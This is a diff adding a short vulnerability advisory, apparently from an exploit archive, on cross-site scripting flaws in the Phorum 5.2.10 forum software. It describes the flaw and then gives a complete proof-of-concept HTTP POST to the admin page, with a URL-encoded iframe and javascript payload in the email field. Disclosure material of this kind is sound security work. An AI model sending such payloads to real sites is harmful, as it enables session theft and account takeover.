@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/34551/info
+  
+Phorum is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+  
+An attacker can exploit these issues to steal cookie-based authentication credentials and launch other attacks.
+  
+Phorum 5.2.10 and 5.2-dev are vulnerable; other versions may also be affected. 
+
+POST /www.example.com/admin.php HTTP/1.1
+
+module=users&referrer=http%3A%2F%2Fwww.victim.com%2Fphorum-5.2.10%2Fadmin.php%3Fmodule%3Dusers
+&addUser=1&username=xss&real_name=xss&email=%3Ciframe%2Fsrc%3D%22javascript%3Aalert%28%27voodoo%27%29%3B%22%3E&password1=xss&password2=xss&admin=0
